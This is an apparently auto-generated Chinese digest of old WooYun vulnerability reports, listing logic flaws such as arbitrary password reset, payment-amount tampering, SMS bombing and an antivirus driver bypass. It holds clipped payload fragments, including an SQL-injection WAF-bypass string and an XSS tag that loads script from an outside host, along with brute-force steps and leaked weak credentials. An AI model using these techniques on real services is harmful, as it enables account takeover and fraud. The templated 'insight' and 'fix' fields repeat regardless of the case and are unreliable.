# LOGIC-FLAWS 漏洞分析

> 自动提取于 2026-01-23 18:57
> 样本数量: 19

## 高频参数
```
  sign: 1次
  url: 1次
  account: 1次
  createTime: 1次
  timestamp: 1次
  wp_id: 1次
  need_exclusive: 1次
  needChangePwd: 1次
  user: 1次
  trivallog: 1次
```

## 元思考模式

### 攻击模式分布
```
  泄露: 1次
  执行: 1次
  越权: 1次
  绕过: 1次
```

## 典型案例

### 案例 1: wooyun-2015-0146507
**标题**: TOM在线某接口设计缺陷可导致撞库用户
**原始类型**: 漏洞类型：设计缺陷/逻辑错误
**URL示例**: 
  - `https://example.com/[已脱敏]`
  - `https://example.com/[已脱敏]`
**洞察提取**:
**Payload片段**:
  ```
  andishangwa	chenzhanlei	220919920610	19920610	2209wan
  ```
  ```
  oruiyx	zhaorui	2210huangfeiguo	3310702	22103307521	8
  ```

### 案例 2: wooyun-2015-0142964
**标题**: 迅雷某客户服务系统存在缺陷可导致成功登陆大量用户账号（分分钟成功数百个）
**原始类型**: 漏洞类型：设计缺陷/逻辑错误
**参数**: `sign, url, account, createTime, timestamp`
**URL示例**: 
  - `https://example.com/[已脱敏]`
  - `https://example.com/[已脱敏]`
**洞察提取**:
**Payload片段**:
  ```
  orWeAjsn10Nin0w0vq7wPgbfbrrE&createTime=1442980310&s
  ```
  ```
  ord=123456&timestamp=1442980329252&callback=jsonp2 H
  ```
  ```
  ; CPU iPhone OS 8_4 like Mac OS
  ```

### 案例 3: wooyun-2015-0157940
**标题**: 某单位存在安全漏洞股份有限公司设计缺陷信息泄露
**原始类型**: 漏洞类型：设计缺陷/逻辑错误
**参数**: `wp_id, need_exclusive, needChangePwd, user, trivallog`
**URL示例**: 
  - `http://**.**.**.**/POST`
  - `http://**.**.**.**/ygr/servlet/MainServerContent-Type:`
**洞察提取**:
**Payload片段**:
  ```
  orm-urlencodedUser-Agent: Mozilla/5.0 (compatible; M
  ```
  ```
  ord=123456密码置为：123456用户名如下：liujianjunzhangminwangdan
  ```
  ```
  ; MSIE 9.0; Windows NT 6.1; WOW
  ```

### 案例 4: wooyun-2015-0125884
**标题**: p2p金融安全之利苍贷任意密码重置(土豪账户演示)
**原始类型**: 漏洞类型：设计缺陷/逻辑错误
**参数**: `code`
**URL示例**: 
  - `https://example.com/[已脱敏]`
  - `https://example.com/[已脱敏]`
**洞察提取**:
**Payload片段**:
  ```
  Origin: https://example.com/[已脱敏] XMLHt
  ```
  ```
  orm-urlencodedReferer: https://example.com/[已脱敏]
  ```
  ```
  ; q=0.01Origin: https://example.com/[已脱敏]
  ```

### 案例 5: wooyun-2015-0104574
**标题**: MIUI6 设计缺陷特定情况下可导致锁屏密码被绕过
**原始类型**: 漏洞类型：设计错误/逻辑缺陷
**洞察提取**:

### 案例 6: wooyun-2014-048068
**标题**: 某电商平台折扣优惠商品的业务逻辑问题
**原始类型**: 漏洞类型：设计缺陷/逻辑错误
**洞察提取**:

### 案例 7: wooyun-2015-098352
**标题**: WDCP后台的登录IP可被伪造
**原始类型**: 漏洞类型：设计缺陷/逻辑错误
**洞察提取**:
**Payload片段**:
  ```
  or均)来自ksc前辈某个漏洞的描述**（=感觉我厚脸皮呀=）**我不知道要不要这样说明一下噢，如果不需
  ```
  ```
  orwarded-For假如仅仅是提示用户的地方使用的此信息，则问题不是很严重若其他地方有基于ip地址做
  ```

### 案例 8: wooyun-2013-021104
**标题**: 某手机厂商积分商城刷花瓣兑换产品
**原始类型**: 漏洞类型：设计缺陷/逻辑错误
**洞察提取**:

### 案例 9: wooyun-2015-0124697
**标题**: 某通信厂商某重要站点存在任意密码重置漏洞
**原始类型**: 漏洞类型：设计缺陷/逻辑错误
**URL示例**: 
  - `https://example.com/[已脱敏]`
**洞察提取**:
  - 漏洞地址：https://example.com/[已脱敏]

### 案例 10: wooyun-2012-011899
**标题**: 畅途网任意用户密码修改
**原始类型**: 漏洞类型：设计缺陷/逻辑错误
**洞察提取**:

### 案例 11: wooyun-2015-0121219
**标题**: 橡果国际任意账户密码重置
**原始类型**: 漏洞类型：设计缺陷/逻辑错误
**URL示例**: 
  - `https://example.com/[已脱敏]`
**洞察提取**:
  - 任意手机号注册，任意账户密码重置找回密码的地方https://example.com/[已脱敏] 为true就可以重置了任意手机号注册同理
**Payload片段**:
  ```
  ord输入18888888888发送验证码后，随便输个验证码，然后会自动发包看验证码是否正确。截返回的包
  ```

### 案例 12: wooyun-2014-063123
**标题**: 某连锁酒店验证码设置不当可修改用户密码
**原始类型**: 漏洞类型：网络设计缺陷/逻辑错误
**URL示例**: 
  - `https://example.com/[已脱敏]`
**洞察提取**:
  - https://example.com/[已脱敏] 找回密码 找了网站上留的一个联系人 不好意思~~然后找回发现验证码直接在返回信息中，填入ok 登陆结果什么都没 走了~~

### 案例 13: wooyun-2015-0126466
**标题**: 良仓某处缺陷可导致任意用户密码修改
**原始类型**: 漏洞类型：设计缺陷/逻辑错误
**URL示例**: 
  - `https://example.com/[已脱敏]`
**洞察提取**:
  - 首先来到忘记密码处https://example.com/[已脱敏]

### 案例 14: wooyun-2015-0115632
**标题**: 一嗨租车越权删除整站发票信息（19W数据）
**原始类型**: 漏洞类型：设计缺陷/逻辑错误
**洞察提取**:

### 案例 15: wooyun-2013-037929
**标题**: 多玩网可以卡任何高于OW权限的灰色马甲
**原始类型**: 漏洞类型：设计缺陷/逻辑错误
**洞察提取**:


---

## 批次 2 (索引 200-399)
> 样本数量: 23

### 高频参数
```
  __EVENTARGUMENT: 1次
  __VIEWSTATE: 1次
  page: 1次
  __EVENTVALIDATION: 1次
  user: 1次
```

### 典型案例

#### wooyun-2015-0117052
**上海机场WIFI系统web portal绕过登陆及其它几种风险分析**
- 参数: `err_flag, userName, essid, paramStr, url`
- Payload: `Origin: https://example.com/[已脱敏] Mozilla/`

#### wooyun-2014-063895
**Destoon 20140530最新版超全局变量覆盖导致的安全问题(官方demo演示)**
- 参数: `x, from`
- Payload: `oreach(array('_POST', '_GET', '_COOKIE') as $__R) {i`

#### wooyun-2013-037365
**飞信位缘某处设计缺陷可修改任意用户密码（非爆破）**
- 参数: `flag, phone, validatecode, mobile, match`
- Payload: `ort/passport/getPasswordStep.action?flag=phone&valid`

#### wooyun-2014-061633
**某通用图书馆检索系统可修改任意用户密码**
- 参数: `__EVENTARGUMENT, __VIEWSTATE, page, __EVENTVALIDATION`
- Payload: `Origin: https://example.com/[已脱敏] Mozilla/5.0 (W`

#### wooyun-2015-0159704
**安全狗最新版网站防护SQL注入bypass**
- 参数: `id`
- Payload: `and/*/\*/ascii%28substring%28user%28%29,1,1%29%29=114`

#### wooyun-2012-07745
**中国才储测试费用支付任意金额修改及敏感信息泄露**
- 参数: `user, formlink, liangbiao`
- Payload: `ormlink=12&liangbiao=PDP直接拿firebug把5.00改成0.01就可以了，没敢`

#### wooyun-2015-0157092
**福建网龙某平台几个设计缺陷打包可随意登录任意用户帐号消费他人余额**
- 参数: `userAccount, inner, taskid, userForm, newName`
- Payload: `ortHome?inner=1但我发现，在用户登录的时候，程序向服务端发送了一个请求http://tes`

#### wooyun-2015-0103929
**某记账APP任意用户密码重置之你的账单安全么（影响近8000W用户）**

---

## 批次 3 (索引 400-599)
> 样本: 22

### 高频参数
```
  v: 2
  r: 1
  p: 1
  from: 1
  go: 1
```

### 典型案例

#### wooyun-2014-065834
**qibocms 新闻系统 Getshell (需结合解析漏洞)**
- 参数: `job, aid, fid, v`
- Payload: `select_fid=$Guidedb->SelectIn("{$_pre}sort",0,$fid);requ`

#### wooyun-2013-026675
**YY客户端缺陷导致存储型XSS漏洞**
- 参数: `topicId, channelId, bbsZoneId`
- Payload: `<script/src=//tmxk.org/.js></script>怎么让此处的代码出现在web里执行呢？1.`

#### wooyun-2015-0121859
**FineCMS免费版无限制GETshell**
- 参数: `pn, q`

#### wooyun-2016-0188246
**阳光保险app奇葩设计漏洞重置任意用户密码（可泄漏用户敏感信息）**
- 参数: `newPwd, token, newMobile`
- Payload: `; q=0.01User-Agent: Mozilla/5.0`

#### wooyun-2015-0139696
**域名商安全之东方网景高危设计缺陷（泄漏大量敏感信息\可推送短信\发传真等）**

#### wooyun-2015-0139222
**P2P安全之你我金融任意账户注册or登录（非爆破）**

---

## 批次 4 (索引 600-799)
> 样本: 21

### 高频参数
```
  employeeid: 1
  vid: 1
  sysversion: 1
  phonemodel: 1
  type: 1
```

### 典型案例

#### wooyun-2013-045772
**利用某些漏洞可以重置同程网任意用户密码**

#### wooyun-2015-0150361
**大连万达集团APP设计缺陷可再次遍历员工个人信息和部分办公信息**
- 参数: `employeeid, vid, sysversion, phonemodel, type`

#### wooyun-2015-0144922
**小牛电动车修改任意用户密码漏洞（未修改彻底）**
- 参数: `password, re_password`

#### wooyun-2013-036826
**盛大百万亚瑟王支付漏洞，一分钱充MC**
- 参数: `appid, notifyurl, itemname, phoneid, ordersn_game`

#### wooyun-2013-040912
**爱丽网一处有趣的越权（删除优惠卷）**
- 参数: `uname, action, storeid`

#### wooyun-2015-0136483
**Time-Based SSRF-美丽说一处SSRF**
---
### [wooyun-2015-0158081] 人民教育出版社某系统设计逻辑缺陷导致敏感信息泄露
**厂商**: 人民教育出版社 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/mailindex.nsfliyang 123456

**POC**: 同上

**绕过**: 直接利用

**修复**: 修复
---

---
### [wooyun-2012-012225] 好孩子某站点存在支付漏洞
**厂商**: 好孩子育儿网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.存在支付漏洞的是下面这个站点：好孩子集团网上旗舰店https://example.com/[已脱敏]

**POC**: 6.再买两件衣服吧，一共只需要9元：7.点击结算，查看订单信息如下，嗯，加上18元的快递费，仍然只需要付27元哦！8.选择网上银行支付，支付的金额仍是27元哪！测试到这里就结束了，话说有礼物么？

**绕过**: 直接利用

**修复**: 1.像金额这样的信息不要放在页面上，确实有随时被篡改的风险，这些信息本来就在数据库中，可以定义一个字符型的字段代替金额的传输，或者直接由商品唯一标识来查询数据库得到金额；2.签名校验是最重要的了，将购买的商品、数量、金额（或替代字段）、订单的ID号生成一个校验字符串。在每次数据传输的过程中进行校验，
---

---
### [wooyun-2014-067814] mcafee麦咖啡可通过暴力破解到企业授权号获取到所有企业用户的许可密钥
**厂商**: Mcafee（上海）软件有限公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登录界面，使用任意符合规则的授权号2003199-NAI登录，提示相应错误。利用burp suite进行暴力破解，这里我选择授权号的范围为4000000-NAI到8009999-NAI，经过分析，可以获取到批量的正式授权号，然后就提交下载正版的企业软件吧

**POC**: 就上这么多了，很明显的问题，伤害了很多企业用户的利益，我就自己多下载点安全软件用了，mcafee的安全工具做的还是非常好的

**绕过**: 直接利用

**修复**: 加强认证机制，完善设计缺陷
---

---
### [wooyun-2013-016872] 红孩子网站部分功能设计缺陷，影响很严重
**厂商**: 北京红孩子互联科技有限公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1 邮箱绑定漏洞，可以任意轰炸任何邮箱。用某邮箱服务测试了下，虽然某互联网公司对某邮箱服务内容的显示有所优化，但是某互联网公司客户端会不断的弹出收到新邮件的消息，想当的蛋疼。（点击图片可以看大图）2 手机绑定处的验证漏洞，可以给任意手机号进行轰炸，虽然界面上有限制最少3分钟发一次（貌似是因为以前乌云上有人发过吧），但是还是可以通过charles等工具进行后台发送。所以说这样的限制是毫无意义的。。。既然可以短信轰炸了，那么问题就严重了，想轰炸谁就轰炸谁。或者轰炸自己，然后去找移动公司索赔。。。只有想不到，没有做不到。（点击图片可以看大图）

**POC**: 看上面，很详细了。

**绕过**: 直接利用

**修复**: 这两个问题的根本还是在，限制发送邮件（短信）的时间间隔上，一定要从根本进行控制，不要只搞那些表面上的。。。
---

---
### [wooyun-2013-025693] Windows特殊文件名漏洞
**厂商**: 微软 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件夹名漏洞c:\test\wooyun>md \\.\c:\test\wooyun\com1.wooyun设备名漏洞c:\test\wooyun>md \\.\c:\test\wooyun\com1.wooyun

**POC**: 创建的目录，系统不允许删除。而在WIndows2003 和之前的版本。连文件夹里的内容也无法看到。通过网站访问时：https://example.com/[已脱敏] 却可以正常访问。

**绕过**: 直接利用

**修复**: 对于 设备名目录文件，用UNC路径操作rd /s \\.\c:\test\wooyun\com1.wooyun对于 文件夹名漏洞 使用文件全名删除即可rd /s aa..\
---

---
### [wooyun-2013-022046] 中国院线通一分钱看电影漏洞
**厂商**: 电信 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 院线通支付漏洞：先选座位点网上银行看一下正常流程190RMB啊orz...后退再次提交抓包改金额提交哈哈哈有戏了

**POC**: 如上

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0143700] 某家电厂商营销系统存xml注入（进一步可获取客户、员工、订单各种数据）
**厂商**: midea.com | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 认证接口

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先某搜索引擎到某家电厂商的ＩＭＳ然后各种登录尝试，在使用某家电厂商员工登录的时候，抓包发现点异常很明显，应该有注入丢到slqmap(以前还手工测试，有了工具，现在都懒了)看库表数据因为也不清楚业务逻辑，3000多张表，里面很多用户表，数据量太大，也不知道哪个表是什么功能，截其中一个表的count数据说明一下吧

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-020995] 某互联网公司好友聊天发送文件给对方直接冻结对方某互联网公司号码
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 发送不良的文件给某互联网公司好友，然后点击取消（以上重复多次）系统自认为是对方发送的文件包，然后举报好友，官方会把好友的某互联网公司冻结掉我的博客https://example.com/[已脱敏]

**POC**: 然后发送给某互联网公司好友，然后点击取消（以上重复多次）系统自认为是对方发送的文件包然后点击举报如图差不多半小时对方某互联网公司号码就被冻结如图差不多15分钟到30分钟就搞定了

**绕过**: 直接利用

**修复**: 某互联网公司懂的
---

---
### [wooyun-2015-0122314] 良仓商店支付漏洞
**厂商**: iliangcang.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 购物车的商品数量可以修改成负数，so，凑一车商品加加减减，走之修改数量时改成负数刷新页面点击支付跳转某电商平台

**POC**: 如上

**绕过**: 直接利用

**修复**: 付不起，付了也不送、还是算了
---

---
### [wooyun-2012-013133] 移动某社交平台手机短信轰炸
**厂商**: 某运营商 | **年份**: 2012 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 移动某社交平台对用户登录采用两种验证模式，其中短信接收这里处理不当，导致短信轰炸一直F5 刷新下面页面吧～https://example.com/[已脱敏]

**POC**: 自测成功，不信你留移动手机号～

**绕过**: 直接利用

**修复**: 对发送次数做一个验证..
---

---
### [wooyun-2013-018982] 某社交平台某社交平台登录逻辑漏洞导致密码hash成为明文密码
**厂商**: 某社交平台某社交平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 研究了下某社交平台登陆：1，没用https，2，用如下算法加密：SHA1(SHA1(SHA1(password))+servertime+nonc)，3，servertime和nonc由prelogin.php从服务端颁发。某社交平台采用这样方式的动机应该是：1，http性能好又方便，https部署麻烦，支持多终端不方便。所以选择http作为认证协议。2，基于#1的决策，为了防止网络嗅探用户被盗用密码，所以在js中 SHA1(password)，一层不放心，做两层：SHA1(SHA1(password))3，为了防止用户弱口令，加上salt4，为了防止暴力破解，采用salt服务器端颁发的方式基于#1，2，3，4的逻辑链，产生了现在的登录流程和密码加密算法。这样做的隐患是：基于现在的逻辑，某社交平台后端user表中的password只能存储SHA1(password)或者SHA1(SHA1(password)

**POC**: 下图为某社交平台前端js中的password加密部分

**绕过**: 直接利用

**修复**: 1，启用https，必须的。2，取消js加密算法
---

---
### [wooyun-2015-0112258] 中国国旅一元买任意张数旅游票(支付逻辑漏洞)
**厂商**: 中国国旅 | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国国旅买票的时候可以通过burp抓包，修改金额和人数，提交过后可以用一元买N张票以下是详细修改数据提交过后的截图，burp忘了截图了，你们自己可以试下行不行：

**POC**: adultNum和childNum对应成人和小孩数目，可以修改为任意数值。抓到数据后把金额全都修改成1块，提交后：

**绕过**: 直接利用

**修复**: 你们懂得。望注意下安全，测试的时候身份证、游客名随便填都行~乌云虐我千百遍，我待乌云如初恋。再次求邀请码：）
---

---
### [wooyun-2014-061571] 某社交空间Android版逻辑缺陷导致隐私泄漏
**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某社交空间Android版对file域下符号链接限制不当，可导致cookie等用户隐私被窃取

**POC**: import android.net.Uri;import android.os.Bundle;import android.app.Activity;import android.content.Intent;public class MainActivity extends Activity {public final static String MY_PKG ="com.example.testqzone";public final static String MY_TMP_DIR ="/data/data/" + MY_PKG + "/tmp/";public final static

**绕过**: 直接利用

**修复**: 对符号链接进行限制
---

---
### [wooyun-2016-0171185] 搜狗云测平台找回密码功设计不当可任意重置他人密码
**厂商**: 搜狗 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一共犯错了3个错误：第一：验证码是简短的4位纯数字，造成猜解时间段。第二：验证码没有错误次数限制，导致可暴力破解。第三：验证码没有发送次数上限，已知可对手机短信轰炸。此次问题主要是前两点，一分钟之内可任意重置他人密码。输入手机号码，点击获取短信验证码，填写新密码后点击重置密码，抓包它的短信验证码是4位数字，我从1000开始暴力破解可以看到这一行返回数据长度与其它地方不一样，payload值2234就是我们的短信验证码此时密码已经被重置为7777777OK! 登陆成功！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 第一：加大验证码复杂度，建议6位数字和字母混合。第二：限制重试次数，同一手机号验证码错误次数3次后，当前验证码失效，需要重新获取。第三：限制获取次数，每个手机号一天中获取验证码次数不超过3次。
---

---
### [wooyun-2012-011531] gsm sniffing可嗅探短信
**厂商**: 移动,联通 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0149109] 首汽约车某处设计逻辑缺陷任意账号密码重置
**厂商**: 首汽约车 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 官网下个APP走找回密码流程，13333333333验证码四位长，无限制重置密码接口验证码经过base64编码整一份base64编码的4位数字字典开始跑起来结果登陆验证13333333333 123456

**POC**: 如上

**绕过**: 编码绕过

**修复**: 加强验证
---

---
### [wooyun-2015-0144219] 好车主APP购买车险功能存在漏洞金额可任意修改
**厂商**: pahaoche.com | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某车险APP应用在购买车险时可修改支付金额购买成功。

**POC**: step1. 提交正常的支付请求，数据中包含支付金额：step2. 修改支付金额：step3. 支付成功：

**绕过**: 直接利用

**修复**: 建议对支付数据进行加密处理后再进行传输。
---

---
### [wooyun-2015-0100150] UC浏览器下载功能未限制同源可造成RFD攻击
**厂商**: UC Mobile | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在浏览器模式下打开https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这样这个漏洞形成的原因就很简明了，要符合几个条件：1.在返回中能看到我们的输入并且content-type的类型不是普通类型，json或者jsonp等等。。。2.url没有过滤或转义‘/’‘;’3.是下载类型。使用不完整的Content-Disposition:attachment或者是不符合htt
---

---
### [wooyun-2015-0160365] 东华协同办公平台设计逻辑缺陷导致资料泄露
**厂商**: 东华协同办公平台 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台http://**.**.**.**/ylxt/简单密码太多了chenchao 123456lilei 123456wangfeng 123456lijianjun 123456各种内部资料泄露

**POC**: 似乎头像处还可上传getshell。。。本着不做破坏的原则就没试。。

**绕过**: 直接利用

**修复**: 验证码~密码强度管理~你们更专业
---

---
### [wooyun-2014-074213] Huawei MT2 温控系统设计缺陷
**厂商**: 某通信设备厂商 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 参数注入

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Huawei MT2 手机使用[Generic Thermal sysfs driver]对设备进行温度监控，该驱动提对设备温度实时监控的功能，当指定监控设备达到温度设定值时底层进程会通过执行相应配置参数来降低设备温度，通常的方式为限制CPU或GPU频率等等,从而可以防止手机过热而损害某些部件的风险。Huawei MT2 手机底层守护进程为: /system/bin/thermalmMT2厂商配置文件:sampling 5000[systemh]sampling 1000thresholds 43 46 50 64thresholds_clr 41 44 47 58actions app+ucurrent+bcurrent+cpu+gpu ucurrent+bcurrent+cpu+gpu cpu+gpu shutdownaction_info 1+900+512+0+0 900+256+

**POC**: 测试代码:测试手机: Huawei MT2ROM版本: MT2-L05V100R001C17B111Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE, null);startActivity(intent);使用以上代码将调用系统的自带相机功能，系统自带相机启动后大约在10-15秒(视环境温度而定)左右时间即会因为图像处理运算将手机温度逐渐提高至43℃，随后系统温度守护进程会因执行设计缺陷的mitigation功能导致系统相机崩溃。[备注:未测试其它某品牌手机，如果使用同样配置文件可能有相同的问题]

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0144920] 习网蜂蜜果商城任意商品购买（蜂蜜果无限获取）
**厂商**: 习网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 换个三国杀吧，挺经典的burp把response拦下来，之后会用js判断蜂蜜果是否够，把这里改大一点，然后兑换提交订单，把请求拦下来，把count参数改成负值提交，成功加了4000，接下来就能正常兑换了吧XD

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 提交订单的时候要判断数量。祝好
---

---
### [wooyun-2013-036481] 绕过360杀毒任意加载驱动
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上次是安全卫士、这次是杀毒。不算作弊。问题一样的。写个程序枚举注册表HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services，找一个Start值不为4的驱动（最好是第三方驱动），根据路径替换掉驱动文件，重启生效绕过后改个配置文件规则啥的基本就全过了，体力活。

**POC**: 试试就知道

**绕过**: 过滤绕过

**修复**: 他们更懂
---

---
### [wooyun-2015-0165461] 数米基金网主站设计逻辑缺陷令导致多个账号信息暴露
**厂商**: fund123.cn | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: # https://example.com/[已脱敏]

**POC**: #个人信息泄露：#基金信息泄露：

**绕过**: 直接利用

**修复**: # 增强密码校验机制
---

---
### [wooyun-2015-0140164] 天脉网在线订票存在任意金额支付漏洞
**厂商**: 天脉网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 将3000都改为100将3000都改为100得到票了！

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2011-03293] 异地过某互联网公司二代密保三个问题验证
**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 大家都知道异地登录某互联网公司后 有二代密保的 如果直接修改密码 会提示输入三个验证问题才可以修改  因为这是大家不在相同的ip段上面登录的限制  那么如果我们社工到了资料 知道了一个问题的答案  但是其它两个问题没法获得 那我们就没法知道我们知道的答案是否正确 也就是无法单独验证答案的对错那么 我们打开某互联网公司面板的消息管理器  找到以前的 或者某互联网公司里面的陌生人 （没有联系人 可以加自己的某互联网公司）然后点击查看聊天记录好了  会提示大家验证密保问题  但是问题只有一个  而且经过测试 是可以反复输入  而不会有输入限制   那么大家就可以测试自己社来的资料了  而且重新点击上传消息记录后 会自动更换问题  单个测试 相对于安全中心的三个问题来说 简单多了吧

**POC**: 这里以一个某互联网公司为例：安全中心改密码 需要三个问题：而在消息管理器中 只需要一个问题 就可以测试了：

**绕过**: 直接利用

**修复**: 引用安全中心的问题验证  或者 设置输入次数等 都可以解决这个问题
---

---
### [wooyun-2015-0120120] 真融宝Android客户端手势密码绕过+拒绝服务漏洞
**厂商**: 真融宝 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.手势密码绕过2.拒绝服务

